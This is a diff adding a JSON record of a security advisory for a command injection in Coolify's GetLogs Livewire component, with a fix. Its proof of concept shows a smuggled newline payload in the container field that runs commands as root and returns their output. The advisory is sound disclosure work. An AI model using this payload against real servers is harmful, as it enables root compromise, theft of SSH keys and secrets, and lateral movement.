@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-q9j6-xcvx-px63",
+  "repo": {
+    "cve_id": "CVE-2026-34599",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.8,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "## Summary\r\nAn authenticated command injection vulnerability in the GetLogs Livewire component allows users with team membership (lowest privilege `member` role) to execute arbitrary commands as root on managed servers. The `$container` Livewire public property is interpolated directly into shell commands (`docker logs`, `docker service logs`) without sanitization, and can be modified by any client via the Livewire wire protocol because it lacks the `#[Locked]` attribute.\r\n\r\nThe `getLogs()` method performs **no authorization check**  - it does not call `$this->authorize()` or verify the authenticated user's team owns the server or resource. Command output is returned **directly in the HTTP response** via the component's `$outputs` property, effectively giving the attacker an interactive webshell.\r\n\r\n## Details\r\n**Vulnerable File:** `app/Livewire/Project/Shared/GetLogs.php`\r\n\r\n**Vulnerable Code (Multiple Locations)**\r\n\r\nLine 38 (unlocked public property):\r\n\r\n```php\r\npublic ?string $container = null;  // No #[Locked] attribute - client-modifiable\r\n```\r\n\r\nLines 136, 143, 152, 159, 203, 205, 209, 211 - `$container` interpolated directly into shell commands without `escapeshellarg()`:\r\n\r\n```php\r\n$command = \"docker logs -n {$this->numberOfLines} -t {$this->container}\";\r\n```\r\n\r\nThe `$container` property lacks the `#[Locked]` attribute, allowing clients to overwrite it via the `updates` field in `POST /livewire/update`. The injected value is passed to the managed server via SSH using `bash -se` with a heredoc, where newline characters (`\\n`) in the container name become separate command lines.\r\n\r\n`getLogs()` has no authorization check - no `$this->authorize()`, no `Server::ownedByCurrentTeam()`. Contrast with `ExecuteContainerCommand.php` in the same codebase, which validates container names with regex, verifies against running containers, and checks server ownership.\r\n\r\n\r\n## PoC\r\n**Prerequisites:**\r\n\r\n- Coolify v4.0.0-beta.468 or earlier\r\n- Authenticated user with team membership (any role, including `member` - the lowest privilege)\r\n- At least one database, application, or service resource with a running container\r\n- Burp Suite or any HTTP proxy\r\n\r\n**Steps to reproduce:**\r\n\r\n1. **Log in as a low-privilege team member** \r\n<img width=\"1904\" height=\"883\" alt=\"image\" src=\"https://github.com/user-attachments/assets/271ff6bc-fea8-4912-8a60-2460e91d9922\" />\r\n\r\n2. **Switching to a Team with a Database resource (e.g., Root Team)**\r\n<img width=\"1916\" height=\"921\" alt=\"image\" src=\"https://github.com/user-attachments/assets/bfae7487-1fb9-45e5-baf9-ba942c61de54\" />\r\n\r\n\r\n3. **Navigate to the database Logs page** (e.g., `/project/{project}/environment/{env}/database/{db}/logs`). The page renders a Livewire component called `project.shared.get-logs` which automatically calls `getLogs()` via SSH to fetch container logs. The output shows up in the browser.\r\n\r\n<img width=\"1909\" height=\"886\" alt=\"image\" src=\"https://github.com/user-attachments/assets/5e2ee322-309c-4ec6-97da-f4ec49785b1e\" />\r\n\r\n\r\n4. **In Burp HTTP History**, find the `POST /livewire/update` request containing `\"method\":\"getLogs\"` and `\"name\":\"project.shared.get-logs\"`. The request body contains two components, the second one is the GetLogs component with `\"container\":\"postgresql\"` in its snapshot data. **Send to Repeater.**\r\n\r\n<img width=\"1527\" height=\"765\" alt=\"image\" src=\"https://github.com/user-attachments/assets/d31579cc-42f5-4d15-a417-f402ce6847ba\" /> \r\n\r\n<img width=\"1528\" height=\"808\" alt=\"image\" src=\"https://github.com/user-attachments/assets/6e81d27a-5b2a-49bb-9cf5-2614b2b3ad42\" />\r\n\r\n\r\n5. **In Burp Repeater**, modify the `updates` object in the second component of the JSON body to inject the `container` property with newline-separated commands and keep rest of the body same. \r\n\r\n```json\r\n\"updates\": {\r\n    \"container\": \"postgresql 2>/dev/null\\necho '===RCE-START==='\\nid\\nwhoami\\nhostname\\ncat /etc/hostname\\necho '===RCE-END==='\\n#\"\r\n}\r\n```\r\n\r\n**Send the request.** The server responds with HTTP 200. The response JSON contains the RCE output **directly in the `outputs` field** of the returned Livewire snapshot:\r\n\r\n```\r\n\"outputs\":\"\\n...===RCE-START===\\nuid=0(root) gid=0(root) groups=0(root)\\nroot\\n942cfc343b9e\\n942cfc343b9e\\n===RCE-END===\\n\"\r\n```\r\n\r\n<img width=\"1916\" height=\"840\" alt=\"image\" src=\"https://github.com/user-attachments/assets/6982451e-9be6-4f3e-b35f-c372a9f08d2d\" />\r\n\r\nThe injected commands executed as root on the managed server, and the output was returned directly in the HTTP response.\r\n\r\n<img width=\"1908\" height=\"1042\" alt=\"image\" src=\"https://github.com/user-attachments/assets/fdce7afc-938f-4a28-820b-70b4540b73a2\" />\r\n\r\n**What executes on the managed server:**\r\n\r\n```bash\r\nssh root@server 'bash -se' << \\DELIMITER\r\ndocker logs -n 100 -t postgresql 2>/dev/null\r\necho '===RCE-START==='\r\nid\r\nwhoami\r\nhostname\r\ncat /etc/hostname\r\necho '===RCE-END==='\r\n#\r\nDELIMITER\r\n```\r\n\r\nEach `\\n` in the container name becomes a separate command line in the heredoc.\r\n\r\n## Impact\r\n- **Remote Code Execution:** Arbitrary command execution on managed servers with output returned directly in the HTTP response\r\n- **Root Privilege:** All commands execute as root due to Coolify's SSH execution model\r\n- **Interactive Webshell:** Unlike blind injection, command output is returned in the `$this->outputs` property (line 186) of the Livewire response, giving the attacker full interactive command execution over HTTP\r\n- **Missing Authorization:** No `$this->authorize()` or `Server::ownedByCurrentTeam()` check - the component does not verify the user has permission to access the target server/resource\r\n- **Full Server Compromise:** Access to SSH private keys, database credentials, application secrets, and all data on managed infrastructure\r\n- **Lateral Movement:** Coolify stores SSH keys for every connected server, enabling pivot to all managed hosts\r\n\r\n## Recommended Fix\r\n\r\nAdd `#[Locked]` to prevent client-side modification of the container property:\r\n\r\n```php\r\nuse Livewire\\Attributes\\Locked;\r\n\r\n#[Locked]\r\npublic ?string $container = null;\r\n```\r\n\r\nValidate the container name before use in shell commands, consistent with `ExecuteContainerCommand.php`:\r\n\r\n```php\r\nif (!preg_match('/^[a-zA-Z0-9][a-zA-Z0-9_.-]*$/', $this->container)) {\r\n    $this->dispatch('error', 'Invalid container name.');\r\n    return;\r\n}\r\n```\r\n\r\nAdd authorization and server ownership verification:\r\n\r\n```php\r\n$server = Server::ownedByCurrentTeam()->find($this->resource->server_id);\r\nif (! $server) {\r\n    $this->dispatch('error', 'Unauthorized.');\r\n    return;\r\n}",
+    "ghsa_id": "GHSA-q9j6-xcvx-px63",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-q9j6-xcvx-px63",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-q9j6-xcvx-px63"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-34599"
+      }
+    ],
+    "published_at": "2026-07-02T16:36:49Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Authenticated Remote Code Execution in GetLogs Livewire Component",
+    "updated_at": "2026-07-02T16:36:49Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "coollabsio/coolify"
+        },
+        "patched_versions": "4.0.0-beta.471",
+        "vulnerable_version_range": "<= 4.0.0-beta.470"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
